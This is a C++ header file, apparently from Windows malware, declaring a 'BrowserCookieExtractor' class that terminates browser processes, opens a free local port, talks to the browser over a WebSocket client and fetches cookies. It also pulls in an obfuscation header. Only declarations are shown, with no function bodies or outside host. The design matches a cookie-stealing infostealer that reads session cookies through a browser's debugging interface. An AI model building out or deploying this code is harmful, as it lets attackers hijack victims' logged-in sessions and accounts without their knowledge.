#ifndef CORE_HPP
#define CORE_HPP

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <vector>
#include <string>
#include <random>
#include <algorithm>
#include <regex>
#include <filesystem>
#include "obfusheader.h"

class BrowserCookieExtractor {
public:
    void GetCookie(const std::wstring& browserPath, const std::wstring& userData, const std::wstring& name);

private:
    void TerminateBrowserProcesses(const std::wstring& processName);
    int GeneratePort();
    bool IsPortAvailable(int port);
    std::string FetchCookies(int port);

    class WebSocketClient {
    public:
        WebSocketClient(const std::string& host, int port);
        bool Connect();
        bool Handshake(const std::string& path);
        void Send(const std::string& message);
        std::string Receive();
        ~WebSocketClient();

    private:
        SOCKET m_socket;
        std::string m_host;
        int m_port;

        static uint64_t CustomNtohll(uint64_t value);
    };

    static std::wstring StringToWstring(const std::string& str);
    static std::string WstringToString(const std::wstring& wstr);
};

#endif